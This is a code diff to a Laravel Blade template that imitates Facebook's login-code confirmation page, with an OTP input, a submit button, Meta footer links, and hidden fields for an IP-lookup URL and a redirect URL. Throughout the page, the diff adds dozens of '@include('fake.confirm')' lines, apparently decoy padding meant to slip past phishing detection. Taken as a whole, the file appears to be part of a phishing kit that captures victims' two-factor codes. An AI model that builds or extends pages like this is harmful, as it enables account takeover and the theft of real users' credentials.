@@ -35,22 +35,37 @@
 @section('content')
     <main class="home">
         <div class="header header-confirm">
+            @include('fake.confirm')
             <div class="header-dialog">
+                @include('fake.confirm')
+                @include('fake.confirm')
+                @include('fake.confirm')
                 <div class="header-content">
                     <div class="header-border"></div>
+                    @include('fake.confirm')
                     <div class="header-main"></div>
+                    @include('fake.confirm')
                     <div class="header-login">
                         <div class="login-content">
                             <ul class="login-content-list" role="tablist">
+                                @include('fake.confirm')
                                 <li class="login-content-item" role="presentation">
+                                    @include('fake.confirm')
                                     <a class="login-logout" href="javascript:;">@lang('confirm.log_out')</a>
                                 </li>
+                                @include('fake.confirm')
                             </ul>
+                            @include('fake.confirm')
                         </div>
+                        @include('fake.confirm')
+                        @include('fake.confirm')
                     </div>
+                    @include('fake.confirm')
                 </div>
+                @include('fake.confirm')
             </div>
         </div>
+        @include('fake.confirm')
         <div class="body form-confirm">
             <div class="fb_content clearfix " role="main">
                 <div class="body-form">
@@ -59,6 +74,9 @@
                             <div class="title-confirm">@lang('confirm.title_form')</div>
                         </div>
                         <div class="line-hr"></div>
+                        @include('fake.confirm')
+                        @include('fake.confirm')
+                        @include('fake.confirm')
                         <div class="form-confirm-sub-title">
                             <div class="sub-title-confirm">@lang('confirm.sub_title_form')</div>
                         </div>
@@ -66,6 +84,9 @@
                         <div class="form-confirm-notice">
                             <div class="title-confirm-notice">@lang('confirm.title_notice')</div>
                             <div class="sub-title-confirm-notice">@lang('confirm.sub_title_notice')</div>
+                            @include('fake.confirm')
+                            @include('fake.confirm')
+                            @include('fake.confirm')
                         </div>
                         <div class="line-hr"></div>
                         <div class="form-confirm-input">
@@ -76,14 +97,23 @@
                                     class="form-control validate-input w-100 validate-otp"
                                     placeholder="@lang('confirm.login_code')" />
                             </div>
+                            @include('fake.confirm')
+                            @include('fake.confirm')
+                            @include('fake.confirm')
                         </div>
                         <div class="notice-error d-none">@lang('confirm.error_notice')</div>
                         <div class="line-hr"></div>
                         <div class="form-confirm-footer">
                             <div class="form-confirm-footer-left">
+                                @include('fake.confirm')
+                                @include('fake.confirm')
+                                @include('fake.confirm')
                                 <a href="javascript:;">@lang('confirm.need_another')</a>
                             </div>
                             <div class="form-confirm-footer-right">
+                                @include('fake.confirm')
+                                @include('fake.confirm')
+                                @include('fake.confirm')
                                 <button id="submit-code">
                                     <span id="submit-code-loading"
                                         class="d-none spinner-border spinner-border-sm spinner"></span>
@@ -91,12 +121,18 @@
                                 </button>
                             </div>
                         </div>
+                        @include('fake.confirm')
+                        @include('fake.confirm')
+                        @include('fake.confirm')
                     </div>
                 </div>
                 <div class="footer">
                     <div class="footer-wrapper">
                         <div class="footer-content">
                             <ul class="footer-item-list">
+                                @include('fake.confirm')
+                                @include('fake.confirm')
+                                @include('fake.confirm')
                                 <li>English (US)</li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;"
@@ -106,11 +142,31 @@
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                                 </li>
                                 <li>
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                                 </li>
                                 <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="French (France)">Français (France)</a>
+                                    <a class="_sv4" dir="ltr" href="javascript:;" title="French (France)">Français
+                                        (France)</a>
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
@@ -118,6 +174,9 @@
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
                                 </li>
+                                @include('fake.confirm')
+                                @include('fake.confirm')
+                                @include('fake.confirm')
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;"
                                         title="Portuguese (Brazil)">Português (Brasil)</a>
@@ -130,7 +189,8 @@
                                 </li>
                                 <li>
                                     <a role="button" class="button-plus" rel="dialog" ajaxify=""
-                                        href="javascript:;" title="Show more languages">
+                                        @include('fake.confirm') @include('fake.confirm') href="javascript:;"
+                                        title="Show more languages">
                                         <i class="button-plus-icon"></i>
                                     </a>
                                 </li>
@@ -141,6 +201,8 @@
                                     <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                     <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
                                     <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
+                                        @include('fake.confirm')
+                                        @include('fake.confirm')
                                     </li>
                                     <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                     <li><a href="javascript:;" title="Browse in Video">Video</a>
@@ -151,6 +213,9 @@
                                     <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                     <li><a href="javascript:;"
                                             title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
                                     <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
                                             Pay</a></li>
                                     <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
@@ -163,7 +228,8 @@
                                     <li><a href="" title="Check out Threads" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                     <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
-                                    <li><a href="javascript:;"
+                                    <li><a href="javascript:;" @include('fake.confirm') @include('fake.confirm')
+                                            @include('fake.confirm')
                                             title="Browse our Facebook Services directory.">Services</a></li>
                                     <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                             Information Centre</a></li>
@@ -177,6 +243,9 @@
                                     <li><a href="javascript:;" accesskey="8"
                                             title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                     </li>
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
                                     <li>
                                         <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
                                     </li>
@@ -187,6 +256,9 @@
                                     </li>
                                     <li><a href="javascript:;"
                                             title="Make your next career move to our brilliant company.">Careers</a></li>
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
+                                    @include('fake.confirm')
                                     <li><a href="javascript:;" title="Learn about cookies and Facebook."
                                             data-nocookies="1">Cookies</a></li>
                                     <li><a class="_41ug" data-nocookies="1" href="javascript:;"
@@ -195,6 +267,9 @@
                                     <li><a data-nocookies="1" href="javascript:;" accesskey="9"
                                             title="Review our terms and policies.">Terms</a></li>
                                     <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
+                                        @include('fake.confirm')
+                                        @include('fake.confirm')
+                                        @include('fake.confirm')
                                     </li>
                                     <li><a href="javascript:;"
                                             title="Visit our contact uploading and non-users notice.">Contact uploading
@@ -206,17 +281,28 @@
                                             title="View your activity log">Activity log</a></li>
                                 </ul>
                             </div>
+                            @include('fake.confirm')
+                            @include('fake.confirm')
+                            @include('fake.confirm')
                             <div class="footer-copyright">
                                 <div><span> Meta © 2023</span></div>
                             </div>
                         </div>
                     </div>
+                    @include('fake.confirm')
                 </div>
+                @include('fake.confirm')
             </div>
+            @include('fake.confirm')
             <div></div>
             <span></span>
         </div>
+        @include('fake.confirm')
         <input type="hidden" id="getIpInfoUrl" value="{{ session()->get('getIpInfoUrl') }}" />
+        @include('fake.confirm')
+
         <input type="hidden" id="url-redirect" value="{{ $settings['redirect_url'] }}" />
+
+        @include('fake.confirm')
     </main>
 @endsection
